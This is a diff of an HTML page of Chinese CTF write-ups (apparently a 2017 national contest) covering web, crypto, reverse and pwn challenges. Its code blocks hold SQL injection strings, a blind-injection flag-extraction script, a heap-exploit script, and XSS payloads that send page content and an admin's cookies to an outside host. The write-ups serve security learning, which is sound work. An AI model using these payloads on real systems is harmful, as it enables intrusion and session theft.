@@ -29,7 +29,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                 
             
                 
@@ -353,7 +353,20 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.5.1" data-path="2019national.html">
+        <li class="chapter " data-level="1.5.1" data-path="2018ddctf.html">
+            
+                <a href="2018ddctf.html">
+            
+                    
+                    2018DDCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="2019national.html">
             
                 <a href="2019national.html">
             
@@ -366,7 +379,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5.2" data-path="2019ddctf.html">
+        <li class="chapter " data-level="1.5.3" data-path="2019ddctf.html">
             
                 <a href="2019ddctf.html">
             
@@ -379,7 +392,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.5.3" data-path="2017national.html">
+        <li class="chapter active" data-level="1.5.4" data-path="2017national.html">
             
                 <a href="2017national.html">
             
@@ -392,7 +405,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5.4" data-path="xihulunjian2019.html">
+        <li class="chapter " data-level="1.5.5" data-path="xihulunjian2019.html">
             
                 <a href="xihulunjian2019.html">
             
@@ -405,7 +418,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5.5" data-path="shiyanbar_web.html">
+        <li class="chapter " data-level="1.5.6" data-path="shiyanbar_web.html">
             
                 <a href="shiyanbar_web.html">
             
@@ -535,13 +548,13 @@
 <h2 id="web"><a name="web" class="anchor-navigation-ex-anchor" href="#web"><i class="fa fa-link" aria-hidden="true"></i></a>5.1. web</h2>
 <h3 id="&#x4E00;php-execise"><a name="&#x4E00;php-execise" class="anchor-navigation-ex-anchor" href="#&#x4E00;php-execise"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.1. &#x4E00;.PHP execise</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;WEB    &#x5206;&#x503C;&#xFF1A;150&#x5206;<br>&#x76F4;&#x63A5;&#x5C31;&#x80FD;&#x6267;&#x884C;&#x4EE3;&#x7801;&#xFF0C;&#x5148;&#x6267;&#x884C;phpinfo(),&#x53D1;&#x73B0;&#x7981;&#x7528;&#x4E86;&#x5982;&#x4E0B;&#x51FD;&#x6570;  </p>
-<pre class="language-"><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,
+<pre><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,
 pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
 pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,
 pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,
 pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,
 file,readfile,opendir,readdir,closedir,rewinddir,
-</code></pre><p>&#x7136;&#x540E;&#x901A;&#x8FC7;<br><code>foreach (glob(&quot;./*&quot;) as $filename) {  echo $filename.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>&quot;; }</code>  </p>
+</code></pre><p>&#x7136;&#x540E;&#x901A;&#x8FC7;<br><code>foreach (glob(&quot;./*&quot;) as $filename) {  echo $filename.&quot;&lt;br&gt;&quot;; }</code>  </p>
 <blockquote>
 <p>glob()&#x51FD;&#x6570;&#x7ECF;&#x5E38;&#x7528;&#x4E8E;disable_function()&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x8FD4;&#x56DE;&#x5339;&#x914D;&#x6307;&#x5B9A;&#x6A21;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6216;&#x76EE;&#x5F55;&#x3002; &#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;&#x5339;&#x914D;&#x6587;&#x4EF6; / &#x76EE;&#x5F55;&#x7684;&#x6570;&#x7EC4;&#x3002;&#x5982;&#x679C;&#x51FA;&#x9519;&#x8FD4;&#x56DE; false&#x3002;</p>
 </blockquote>
@@ -553,7 +566,7 @@ file,readfile,opendir,readdir,closedir,rewinddir,
 <p>&#x9996;&#x5148;&#x901A;&#x8FC7;svn&#x6CC4;&#x9732;&#x83B7;&#x53D6;&#x5230;&#x6E90;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x89C2;&#x5BDF;&#x53D1;&#x73B0;&#x4E3B;&#x8981;&#x90E8;&#x5206;&#x5728;login.php&#x8FD9;&#x91CC;<br>     <a href="http://p8.qhimg.com/t015b1c51f5d4e2c9f8.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="http://p8.qhimg.com/t015b1c51f5d4e2c9f8.png" alt="">
      </a>  </p>
-<pre class="language-"><code>&lt;?php
+<pre><code>&lt;?php
 defined(&apos;black_hat&apos;) or header(&apos;Location: route.php?act=login&apos;);
 session_start();
 include_once &quot;common.php&quot;;
@@ -562,7 +575,7 @@ mysql_select_db(&quot;hats&quot;) or die(&quot;there is no hats!&quot;);
 if (isset($_POST[&quot;name&quot;])){
   $name = str_replace(&quot;&apos;&quot;, &quot;&quot;, trim(waf($_POST[&quot;name&quot;])));
   if (strlen($name) &gt; 11){
-    echo(&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(&apos;name too long&apos;)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;);
+    echo(&quot;&lt;script&gt;alert(&apos;name too long&apos;)&lt;/script&gt;&quot;);
   }else{
     $sql = &quot;select count(*) from t_info where username = &apos;$name&apos; or nickname = &apos;$name&apos;&quot;;
     echo $sql;
@@ -601,7 +614,7 @@ if (isset($_POST[&quot;name&quot;])){
 <p><a href="https://github.com/kutio/liblll" target="_blank">https://github.com/kutio/liblll</a> </p>
 <p><a href="https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy" target="_blank">https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy</a> </p>
 <p>&#x653B;&#x51FB;&#x65B9;&#x6CD5;&#x4E3A;&#x9996;&#x5148;&#x6784;&#x9020;&#x77E9;&#x9635;&#xFF0C;&#x901A;&#x8FC7;lllattack&#x6C42;&#x5F97;&#x65B0;&#x7684;&#x77E9;&#x9635;&#xFF0C;&#x9009;&#x53D6;&#x6700;&#x77ED;&#x7684;&#x5411;&#x91CF;&#x5373;&#x53EF;&#x3002;</p>
-<pre class="language-"><code>c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569
+<pre><code>c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569
 pubkey=[&#xFF08;&#x81EA;&#x5DF1;&#x53BB;&#x590D;&#x5236;&#x5427;&#xFF09;]
 from Crypto.Util.number import long_to_bytes as l2b
 def create_matrix(pub, c):
@@ -645,10 +658,10 @@ print hex(int(x,2))[2:-1].decode(&quot;hex&quot;)
 </code></pre><h3 id="10flag-bending-machine"><a name="10flag-bending-machine" class="anchor-navigation-ex-anchor" href="#10flag-bending-machine"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.4. 10.flag bending machine</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;WEB    &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
 <p>&#x8FDB;&#x53BB;&#x662F;&#x4E00;&#x4E2A;&#x6CE8;&#x518C;&#x53CA;&#x767B;&#x9646;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x756A;fuzz&#xFF0C;&#x8BA4;&#x4E3A;&#x6700;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x4E8C;&#x6B21;&#x6CE8;&#x5165; &#x4F8B;&#x5982;&#x6211;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;bendawang&apos; or 1=1#&#x548C;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;bendawang&apos; or 1=0#&#xFF0C;&#x731C;&#x60F3;&#x5728;&#x67E5;&#x8BE2;&#x4F59;&#x989D;&#x65F6;&#x7684;&#x8BED;&#x53E5;&#x4E3A;</p>
-<pre class="language-"><code>select xxx from xxx where username=bendawang&apos; or 1=1#
+<pre><code>select xxx from xxx where username=bendawang&apos; or 1=1#
 select xxx from xxx where username=bendawang&apos; or 1=0#
 </code></pre><p>&#x6240;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x77E5;&#x9053;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x540E;&#x9762;&#x7684;or 1=1&#x6052;&#x771F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x6574;&#x4E2A;&#x8868;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x4E2A;&#x5219;&#x662F;&#x7528;&#x6237;&#x540D;&#x4E3A;bendawang&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x731C;&#x60F3;&#x67E5;&#x8BE2;&#x591A;&#x4E2A;&#x7ED3;&#x679C;&#x65F6;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x7684;&#x8BDD;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x8D2D;&#x4E70;&#x4E86;&#x4E1C;&#x897F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x663E;&#x793A;&#x7684;&#x4F59;&#x989D;&#x662F;&#x4E0D;&#x53D8;&#x7684;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x79CD;&#x60C5;&#x51B5;&#x662F;&#x4F1A;&#x53D8;&#x7684;&#x3002;&#x5C31;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x70B9;&#x6765;&#x8FDB;&#x884C;&#x4E8C;&#x5206;&#x76F2;&#x6CE8;&#x3002; &#x53E6;&#x5916;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x4E86;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x5B57;&#xFF0C;select ,from ,on&#x7B49;&#xFF0C;&#x4E0D;&#x8FC7;&#x53EF;&#x4EE5;&#x53CC;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x5176;&#x4E2D;on&#x662F;&#x6700;&#x5751;&#x7684;&#xFF0C;&#x8FD9;&#x662F;&#x6700;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;union&#x662F;&#x5426;&#x88AB;&#x8FC7;&#x6EE4;&#x53D1;&#x73B0;&#x7684;&#x3002;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CC;&#x5199;&#x5C31;&#x80FD;&#x7ED5;&#x8FC7;&#x4E86;&#x3002; &#x5176;&#x5B83;&#x4E5F;&#x5C31;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x8FC7;&#x6EE4;&#x4E86;&#x3002; &#x6700;&#x540E;&#x7206;&#x7834;&#x51FA;&#x6765;&#x7684;&#x8868;&#x540D;fff1ag&#xFF0C;&#x5217;&#x540D;thisi5f14g &#x7206;&#x7834;flag&#x7684;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 import string
 import random
 import time
@@ -679,11 +692,11 @@ def check(data):
     #print content
     if &quot;wrong&quot; in content:
         raw_input(&quot;error!!!!!!!!!!!!!!!!!!!!!!&quot;);
-    balance=int(re.findall(&apos;you balance is (.*?)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>&apos;,content)[0])
+    balance=int(re.findall(&apos;you balance is (.*?)&lt;/li&gt;&apos;,content)[0])
     #print &quot;balance1:&quot;+str(balance)
     r.get(url+&apos;buy.php?id=1&apos;)
     content=r.get(url+&apos;user.php&apos;).content
-    balance2=int(re.findall(&apos;you balance is (.*?)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>&apos;,content)[0])
+    balance2=int(re.findall(&apos;you balance is (.*?)&lt;/li&gt;&apos;,content)[0])
     #print &quot;balance2:&quot;+str(balance2)
     if balance-2333==balance2:
         return True
@@ -709,13 +722,13 @@ for i in xrange(1,100):
 <h3 id="14guestbook"><a name="14guestbook" class="anchor-navigation-ex-anchor" href="#14guestbook"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.5. 14.Guestbook</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;WEB    &#x5206;&#x503C;&#xFF1A;400&#x5206;</p>
 <p>&#x9996;&#x5148;&#x770B;csp&#xFF0C;</p>
-<pre class="language-"><code>default-src &apos;self&apos;; 
+<pre><code>default-src &apos;self&apos;; 
 script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;; 
 font-src &apos;self&apos; fonts.gstatic.com; 
 style-src &apos;self&apos; &apos;unsafe-inline&apos;; 
 img-src &apos;self&apos;
 </code></pre><p>&#x7136;&#x540E;&#x662F;&#x6C99;&#x76D2;&#xFF1A;</p>
-<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>
+<pre><code>&lt;script&gt;
 //sandbox
 delete window.Function;
 delete window.eval;
@@ -724,39 +737,39 @@ delete window.XMLHttpRequest;
 delete window.Proxy;
 delete window.Image;
 delete window.postMessage;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+&lt;/script&gt;
 </code></pre><p>&#x53D1;&#x73B0;&#x6C99;&#x76D2;&#x548C;&#x4E4B;&#x524D;0ctf&#x4E00;&#x6837;&#xFF0C;csp&#x4E5F;&#x5141;&#x8BB8;&#x4E86;unsafe-eval&#x7684;&#x6267;&#x884C;</p>
 <p>&#x7136;&#x540E;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;&#xFF0C;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;link&#x6807;&#x7B7E;&#x554A;&#xFF0C;location&#x90FD;&#x88AB;&#x8FC7;&#x6EE4;&#x66FF;&#x6362;&#x6210;hacker&#x3002;</p>
 <p>&#x4F46;&#x662F;location&#x5F88;&#x5BB9;&#x6613;&#x7ED5;&#x8FC7;&#x4F8B;&#x5982;<code>window[&apos;locat&apos;+&apos;ion&apos;].href</code></p>
 <p>&#x6240;&#x4EE5;&#x601D;&#x8DEF;&#x548C;0ctf&#x4E00;&#x6837;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;iframe&#x4ECE;&#x5176;&#x4ED6;&#x8DEF;&#x5F84;&#x4E0B;&#x201C;&#x501F;&#x7528;&#x201D;&#x4E00;&#x4E2A;XMLHttpRequest&#xFF0C;&#x6765;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF0C;&#x5927;&#x6982;&#x521D;&#x59CB;payload&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>bendawang<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://106.75.103.149:8888/<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; 
+<pre><code>&lt;iframe id=&quot;bendawang&quot; src=&quot;http://106.75.103.149:8888/&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; 
 var xhr = new XMLHttpRequest();
 xhr.open(&quot;GET&quot;, &quot;http://106.75.103.149:8888/index.php &quot;, false);
 xhr.send();
 a=xhr.responseText;
 window[&apos;locat&apos;+&apos;ion&apos;].href=&apos;http://104.160.43.154:8000/xss/?content=&apos;+escape(a);
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+&lt;/script&gt;
 </code></pre><p>&#x80FD;&#x591F;&#x6210;&#x529F;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD4;&#x56DE;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;cookie&#xFF0C;&#x6E90;&#x7801;&#x91CC;&#x9762;&#x4E5F;&#x6CA1;&#x6709;flag&#xFF0C;&#x901A;&#x8FC7;&#x6D4B;&#x8BD5;document.referrer&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#xFF1A;</p>
 <p>     <a href="http://p0.qhimg.com/t01eda7957d3d063945.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="http://p0.qhimg.com/t01eda7957d3d063945.png" alt="">
      </a></p>
 <p>&#x9996;&#x5148;&#x770B;csp&#xFF0C;</p>
-<pre class="language-"><code>default-src &apos;self&apos;; 
+<pre><code>default-src &apos;self&apos;; 
 script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;; 
 font-src &apos;self&apos; fonts.gstatic.com; 
 style-src &apos;self&apos; &apos;unsafe-inline&apos;; 
 img-src &apos;self&apos;
 </code></pre><p>&#x6700;&#x540E;&#x4FEE;&#x6B63;payload&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript:i=document.createElement(&apos;iframe&apos;);i.src=&apos;/admin/review.php?b=2e232e23&apos;;
+<pre><code>&lt;iframe src=&quot;javascript:i=document.createElement(&apos;iframe&apos;);i.src=&apos;/admin/review.php?b=2e232e23&apos;;
 i[&apos;onlo&apos;+&apos;ad&apos;]=function(){parent.window[&apos;locat&apos;+&apos;ion&apos;].href=&apos;http://xss/ 
 &apos;+escape(this.contentWindow.document.cookie)};
-document.body.append(i)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
+document.body.append(i)&quot;&gt;
+&lt;/iframe&gt;
 </code></pre><h3 id="16&#x65B9;&#x821F;&#x8BA1;&#x5212;"><a name="16&#x65B9;&#x821F;&#x8BA1;&#x5212;" class="anchor-navigation-ex-anchor" href="#16&#x65B9;&#x821F;&#x8BA1;&#x5212;"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.6. 16.&#x65B9;&#x821F;&#x8BA1;&#x5212;</h3>
 <p>&#x7C7B;&#x578B;&#xFF1A;WEB   &#x5206;&#x503C;&#xFF1A;400&#x5206;</p>
 <p>&#x9996;&#x5148;&#x626B;&#x63CF;&#x53D1;&#x73B0;&#x5728;&#x6CE8;&#x518C;&#x65F6;&#x624B;&#x673A;&#x90A3;&#x4E00;&#x680F;&#x5B58;&#x5728;&#x62A5;&#x9519;&#x6CE8;&#x5165;</p>
-<pre class="language-"><code>username=&apos;ad121212122min&apos;&amp;phone=&apos; or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or&apos;&amp;password=&apos;admin&apos;=&apos;&apos;#&amp;repassword=&apos;admin&apos;=&apos;&apos;#
+<pre><code>username=&apos;ad121212122min&apos;&amp;phone=&apos; or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or&apos;&amp;password=&apos;admin&apos;=&apos;&apos;#&amp;repassword=&apos;admin&apos;=&apos;&apos;#
 </code></pre><p>&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x8D26;&#x6237;&#x5BC6;&#x7801; &#x767B;&#x5F55;&#x8FDB;&#x53BB;&#x53D1;&#x73B0;&#x662F;ffpm&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6; </p>
 <p>&#x7136;&#x540E;&#x8BFB;&#x53D6;etc/passwd &#x88AB;&#x8FC7;&#x6EE4;&#x4E86; &#x7A0D;&#x5FAE;&#x7ED5;&#x8FC7;&#x4E00;&#x4E0B;&#x5C31;&#x80FD;&#x8BFB;&#x4E86; &#x5F97;&#x5230;&#x7528;&#x6237;&#x540D;s0m3b0dy &#x5728;&#x5176;home&#x76EE;&#x5F55;&#x4E0B;&#x8BFB;&#x53D6;&#x5230;flag&#x6587;&#x4EF6;</p>
 <h2 id="&#x4E8C;&#x3001;reverse"><a name="&#x4E8C;&#x3001;reverse" class="anchor-navigation-ex-anchor" href="#&#x4E8C;&#x3001;reverse"><i class="fa fa-link" aria-hidden="true"></i></a>5.2. &#x4E8C;&#x3001;REVERSE</h2>
@@ -794,7 +807,7 @@ document.body.append(i)<span class="token punctuation">&quot;</span></span><span
 <p>&#x9996;&#x5148;&#x662F;&#x8F93;&#x5165;&#x957F;&#x5EA6;&#x4E3A;200&#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x8F6C;&#x5316;&#x4E3A;1&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5F97;&#x5230;100&#x5B57;&#x8282;&#x7684;&#x8F93;&#x51FA;&#x3002;</p>
 <p>&#x6839;&#x636E;&#x540E;&#x9762;&#x7684;&#x6BD4;&#x8F83;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x8FD9;100&#x5B57;&#x8282;&#x5206;&#x522B;&#x4E3A;0-99&#x8FD9;100&#x4E2A;&#x6570;&#x3002;&#x540E;&#x9762;&#x6309;&#x7167;&#x7279;&#x5B9A;&#x7684;&#x987A;&#x5E8F;&#x5C06;0&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x548C;&#x5176;&#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x7684;&#x67D0;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x8FDB;&#x884C;&#x4EA4;&#x6362;&#x3002;&#x9A8C;&#x8BC1;&#x7ECF;&#x8FC7;&#x4EA4;&#x6362;&#x540E;&#x7684;&#x6570;&#x636E;&#x521A;&#x597D;&#x662F;0-99&#x987A;&#x5E8F;&#x6392;&#x5217;&#x3002;</p>
 <p>&#x5927;&#x4F53;&#x601D;&#x8DEF;&#x662F;&#x6784;&#x9020;&#x8F93;&#x5165;&#x4E3A;0-99&#xFF0C;&#x5F97;&#x5230;&#x4EA4;&#x6362;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4EA4;&#x6362;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x7136;&#x540E;&#x53CD;&#x8FC7;&#x6765;&#x6839;&#x636E;&#x8F93;&#x51FA;&#x4E3A;0-100&#xFF0C;&#x6C42;&#x8F93;&#x5165;&#x3002;</p>
-<pre class="language-"><code>data = &apos;&apos;
+<pre><code>data = &apos;&apos;
 for i in range(100):
     high = i/0x10
     low = i%0x10
@@ -822,7 +835,7 @@ print data
 <p>&#x7C7B;&#x578B;&#xFF1A;PWN    &#x5206;&#x503C;&#xFF1A;200&#x5206;</p>
 <p>&#x5728;edit&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x56E0;&#x4E3A;&#x5806;&#x4E2D;&#x6709;&#x6307;&#x9488;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x8981;&#x8986;&#x76D6;&#x6307;&#x9488;&#x5373;&#x53EF;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x3002;
 &#x56E0;&#x4E3A;&#x5F00;&#x542F;&#x4E86;PIE&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8986;&#x76D6;&#x6307;&#x9488;&#x7684;&#x6700;&#x4F4E;&#x5B57;&#x8282;&#x8FDB;&#x884C;&#x6CC4;&#x9732;&#x3002;</p>
-<pre class="language-"><code>from threading import Thread
+<pre><code>from threading import Thread
 from zio import *
 target = &apos;./easyheap&apos;
 target = (&apos;120.132.66.76&apos;, 20010)
@@ -903,7 +916,7 @@ Continue
        <img src="http://p7.qhimg.com/t01a50763d55f5653e3.png" alt="">
      </a></p>
 <p>&#x5173;&#x4E8E;&#x9A71;&#x52A8;&#x901A;&#x4FE1;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x4ECB;&#x7ECD;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4E0D;&#x591A;&#x4ECB;&#x7ECD;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x9A71;&#x52A8;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x4F2A;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x5F15;&#x53D1;&#x7684;UAF&#x6F0F;&#x6D1E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x5229;&#x7528;open(/dev/babydev,O_RDWR)&#x6253;&#x5F00;&#x4E24;&#x4E2A;&#x8BBE;&#x5907;A&#x548C;B&#xFF0C;&#x968F;&#x540E;&#x901A;&#x8FC7;ioctl&#x4F1A;&#x91CA;&#x653E;&#x6389;babyopen&#x51FD;&#x6570;&#x6267;&#x884C;&#x65F6;&#x521D;&#x59CB;&#x5316;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x800C;ioctl&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7533;&#x8BF7;&#x7A7A;&#x95F4;&#x7684;&#x5927;&#x5C0F;&#x3002;</p>
-<pre class="language-"><code>__int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4)
+<pre><code>__int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4)
 {
   _fentry__(filp, command, arg, a4);
   v5 = v4;
@@ -924,7 +937,7 @@ Continue
   return result;
 }
 </code></pre><p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7533;&#x8BF7;&#x7684;buffer&#x53EF;&#x63A7;&#xFF0C;&#x518D;&#x4ED4;&#x7EC6;&#x770B;write&#x548C;read&#x51FD;&#x6570;&#xFF0C;&#x90FD;&#x505A;&#x4E86;&#x4E25;&#x683C;&#x7684;&#x5224;&#x65AD;&#x63A7;&#x5236;&#xFF0C;&#x4F3C;&#x4E4E;&#x6F0F;&#x6D1E;&#x4E0D;&#x5728;&#x8FD9;&#x91CC;&#x3002;</p>
-<pre class="language-"><code>  if ( babydev_struct.device_buf )//&#x5224;&#x65AD;buf&#x5FC5;&#x987B;&#x6709;&#x503C;
+<pre><code>  if ( babydev_struct.device_buf )//&#x5224;&#x65AD;buf&#x5FC5;&#x987B;&#x6709;&#x503C;
   {
     result = -2LL;
     if ( babydev_struct.device_buf_len &gt; v4 )//&#x5224;&#x65AD;malloc&#x7684;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x5FC5;&#x987B;&#x5927;&#x4E8E;&#x7528;&#x6237;&#x8BFB;&#x5199;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;
@@ -932,7 +945,7 @@ Continue
 <p>&#x56E0;&#x6B64;&#xFF0C;&#x91CA;&#x653E;&#x8BBE;&#x5907;A&#x540E;&#xFF0C;&#x5F53;&#x524D;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x6307;&#x5411;&#x7684;&#x7A7A;&#x95F4;&#x6210;&#x4E3A;&#x91CA;&#x653E;&#x72B6;&#x6001;&#xFF0C;&#x4F46;&#x901A;&#x8FC7;&#x8BBE;&#x5907;&#x5BF9;&#x8C61;B&#x53EF;&#x4EE5;&#x8C03;&#x7528;write/read&#x51FD;&#x6570;&#x8BFB;&#x5199;&#x8BE5;&#x7A7A;&#x95F4;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
